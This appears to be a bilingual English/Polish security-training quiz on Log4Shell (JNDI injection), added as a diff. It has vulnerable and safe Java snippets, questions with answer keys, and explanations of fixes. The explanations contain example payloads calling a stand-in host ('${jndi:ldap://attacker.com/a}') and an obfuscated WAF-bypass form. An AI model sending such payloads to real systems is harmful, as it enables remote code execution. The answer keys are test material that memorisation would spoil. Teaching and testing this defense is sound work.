@@ -1,0 +1,101 @@
+threatId: "cat_1_research10"
+title:
+  en: JNDI Injection (Log4Shell) — knowledge check
+  pl: JNDI Injection (Log4Shell) — sprawdzian wiedzy
+passScore: 80
+questions:
+  - id: q1
+    type: vuln-or-not
+    prompt:
+      en: Does this Log4j logging call contain a Log4Shell-class vulnerability (Log4j < 2.15, defaults)?
+      pl: Czy to wywołanie logowania Log4j zawiera podatność klasy Log4Shell (Log4j < 2.15, domyślne ustawienia)?
+    snippet:
+      lang: java
+      code: |
+        Logger log = LogManager.getLogger();
+        String ua = request.getHeader("User-Agent");
+        log.info("Request from UA: {}", ua);
+    isVulnerable: true
+    cwe: CWE-917
+    explanation:
+      en: Log4j's message-lookup substitution expands ${...} tokens in the fully-formatted message, including the parameterized {} value. If ua is "${jndi:ldap://attacker.com/a}", Log4j performs a JNDI lookup — merely logging the header triggers it, no explicit lookup() call needed anywhere in the app.
+      pl: Podstawianie lookupów wiadomości Log4j rozwija tokeny ${...} w w pełni sformatowanej wiadomości, w tym w sparametryzowanej wartości {}. Jeśli ua to "${jndi:ldap://attacker.com/a}", Log4j wykonuje lookup JNDI — samo zalogowanie nagłówka to wyzwala, bez żadnego jawnego wywołania lookup() gdziekolwiek w aplikacji.
+  - id: q2
+    type: vuln-or-not
+    prompt:
+      en: Is this JNDI lookup code safe from injection?
+      pl: Czy ten kod lookupu JNDI jest bezpieczny od wstrzyknięcia?
+    snippet:
+      lang: java
+      code: |
+        private static final Set<String> ALLOWED = Set.of("jdbc/AppDB", "jdbc/ReportDB");
+        String name = request.getParameter("resource");
+        if (!ALLOWED.contains(name)) {
+            throw new SecurityException("Disallowed JNDI name");
+        }
+        Object obj = new InitialContext().lookup(name);
+    isVulnerable: false
+    cwe: CWE-917
+    explanation:
+      en: The lookup name is checked against a fixed allow-list of known-good logical names before use — an attacker cannot smuggle a URL/scheme like "ldap://attacker.com/Exploit" through this check, since it isn't a member of the ALLOWED set.
+      pl: Nazwa lookupu jest sprawdzana względem stałej allowlisty znanych, dobrych nazw logicznych przed użyciem — atakujący nie może przemycić URL/schematu jak "ldap://attacker.com/Exploit" przez tę kontrolę, bo nie jest członkiem zbioru ALLOWED.
+  - id: q3
+    type: multiple-choice
+    prompt:
+      en: An application has trustURLCodebase=false set (default on modern JDKs), so remote class loading via LDAP is blocked. Can an attacker still achieve RCE through a JNDI lookup?
+      pl: Aplikacja ma ustawione trustURLCodebase=false (domyślne na nowoczesnych JDK), więc ładowanie zdalnych klas przez LDAP jest zablokowane. Czy atakujący może wciąż osiągnąć RCE przez lookup JNDI?
+    choices:
+      - id: a
+        label: { en: "No — trustURLCodebase=false completely eliminates the vulnerability class", pl: "Nie — trustURLCodebase=false całkowicie eliminuje tę klasę podatności" }
+      - id: b
+        label: { en: "Yes — a malicious server can return a serialized object exploiting a deserialization gadget already on the classpath", pl: "Tak — złośliwy serwer może zwrócić zserializowany obiekt wykorzystujący gadżet deserializacji już obecny w classpath" }
+      - id: c
+        label: { en: "No — RCE via JNDI is only possible over LDAP, never RMI or other providers", pl: "Nie — RCE przez JNDI jest możliwe tylko przez LDAP, nigdy przez RMI czy inne dostawców" }
+    correctChoiceIds: ["b"]
+    explanation:
+      en: trustURLCodebase=false only blocks the remote-codebase-loading path. If a gadget chain (e.g. from Commons Collections) is already present on the victim's classpath, a malicious LDAP/RMI server can return a serialized object that triggers that gadget on deserialization — achieving RCE with no remote class download at all. This is exactly why Log4Shell exploitation on hardened JDKs pivoted to local-gadget techniques.
+      pl: trustURLCodebase=false blokuje tylko ścieżkę ładowania zdalnego codebase. Jeśli łańcuch gadżetów (np. z Commons Collections) jest już obecny w classpath ofiary, złośliwy serwer LDAP/RMI może zwrócić zserializowany obiekt, który wyzwala ten gadżet przy deserializacji — osiągając RCE bez żadnego zdalnego pobrania klasy. Dokładnie dlatego eksploatacja Log4Shell na wzmocnionych JDK przeszła na techniki lokalnych gadżetów.
+  - id: q4
+    type: multiple-choice
+    prompt:
+      en: What is NVD's actual, official primary CWE classification for CVE-2021-44228 (Log4Shell)?
+      pl: Jaka jest rzeczywista, oficjalna główna klasyfikacja CWE NVD dla CVE-2021-44228 (Log4Shell)?
+    choices:
+      - id: a
+        label: { en: "A dedicated \"CWE-JNDI\" entry made specifically for this vulnerability class", pl: "Dedykowany wpis \"CWE-JNDI\" stworzony specjalnie dla tej klasy podatności" }
+      - id: b
+        label: { en: "CWE-917 — Improper Neutralization of Special Elements used in an Expression Language Statement", pl: "CWE-917 — Improper Neutralization of Special Elements used in an Expression Language Statement" }
+      - id: c
+        label: { en: "CWE-89 — SQL Injection", pl: "CWE-89 — SQL Injection" }
+    correctChoiceIds: ["b"]
+    explanation:
+      en: There is no dedicated JNDI-injection CWE. NVD's primary assignment for CVE-2021-44228 is CWE-917 (Expression Language Injection), reflecting Log4j's ${...} message-lookup substitution as the injection point. CWE-502 (Deserialization of Untrusted Data) captures the underlying remote-object/gadget mechanism as a complementary classification.
+      pl: Nie ma dedykowanego CWE dla wstrzyknięcia JNDI. Główne przypisanie NVD dla CVE-2021-44228 to CWE-917 (Expression Language Injection), odzwierciedlające podstawianie lookupów wiadomości ${...} Log4j jako punkt wstrzyknięcia. CWE-502 (Deserialization of Untrusted Data) opisuje leżący pod spodem mechanizm zdalnego obiektu/gadżetu jako klasyfikację uzupełniającą.
+  - id: q5
+    type: pick-the-fix
+    prompt:
+      en: A team is patching a Log4Shell-affected application. Which variant is the actually complete fix?
+      pl: Zespół łata aplikację dotkniętą Log4Shell. Który wariant jest faktycznie kompletną naprawą?
+    variants:
+      - id: v1
+        lang: java
+        code: |
+          // set the interim mitigation flag and stop there
+          // -Dlog4j2.formatMsgNoLookups=true
+      - id: v2
+        lang: java
+        code: |
+          // upgrade log4j-core to 2.17.1+
+          // (via Maven/Gradle dependency version bump)
+      - id: v3
+        lang: java
+        code: |
+          // add a WAF rule blocking the literal string "${jndi:"
+      - id: v4
+        lang: java
+        code: |
+          // only set trustURLCodebase=false JVM-wide and stop there
+    correctVariantId: v2
+    explanation:
+      en: Upgrading to 2.17.1+ is the only option that closes all four real CVEs (44228, 45046, 45105, 44832) — it removes message lookups by default and restricts JNDI to allow-listed protocols. v1's formatMsgNoLookups flag is explicitly documented as incomplete for CVE-2021-45046 in non-default MDC/Context Lookup configurations; v3's WAF rule is defeated within hours by nested/obfuscated payloads like ${${lower:j}ndi:...}; v4's trustURLCodebase=false blocks only remote-codebase loading, not local-gadget deserialization bypasses.
+      pl: Aktualizacja do 2.17.1+ to jedyna opcja zamykająca wszystkie cztery realne CVE (44228, 45046, 45105, 44832) — domyślnie usuwa lookupy wiadomości i ogranicza JNDI do dozwolonych protokołów. Flaga formatMsgNoLookups z v1 jest wprost udokumentowana jako niepełna dla CVE-2021-45046 w niedomyślnych konfiguracjach MDC/Context Lookup; reguła WAF z v3 jest pokonywana w ciągu godzin przez zagnieżdżone/zaciemnione ładunki jak ${${lower:j}ndi:...}; trustURLCodebase=false z v4 blokuje tylko ładowanie zdalnego codebase, nie obejścia deserializacji lokalnych gadżetów.
